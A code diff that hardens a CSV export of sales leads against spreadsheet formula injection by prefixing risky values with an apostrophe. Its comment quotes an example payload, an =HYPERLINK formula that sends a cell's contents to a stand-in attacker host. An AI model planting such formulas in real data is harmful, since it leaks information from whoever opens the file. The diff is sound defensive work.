@@ -29,11 +29,22 @@ const STATUS_LABELS: Record<string, string> = {
   'closed-lost': 'Closed — Lost',
 }
 
-/** Quote a CSV field, escaping embedded quotes and forcing text for anything risky. */
+/**
+ * Quote a CSV field, escaping embedded quotes and forcing text for anything risky.
+ *
+ * Every value in a lead row is attacker-controlled — anyone on the internet can
+ * POST to /api/leads. Quoting alone does NOT stop Excel, Numbers or LibreOffice
+ * from evaluating a cell that opens with =, +, -, @, tab or CR, so a name like
+ * `=HYPERLINK("https://evil.tld/?d="&A2,"Click here")` becomes a live formula
+ * the moment staff open the export. Prefixing an apostrophe forces the
+ * spreadsheet to treat the value as literal text; the apostrophe itself is not
+ * displayed.
+ */
 function cell(value: unknown): string {
   if (value == null) return ''
   const s = String(value)
-  return `"${s.replace(/"/g, '""')}"`
+  const safe = /^[=+\-@\t\r]/.test(s) ? `'${s}` : s
+  return `"${safe.replace(/"/g, '""')}"`
 }
 
 interface LeadRow {
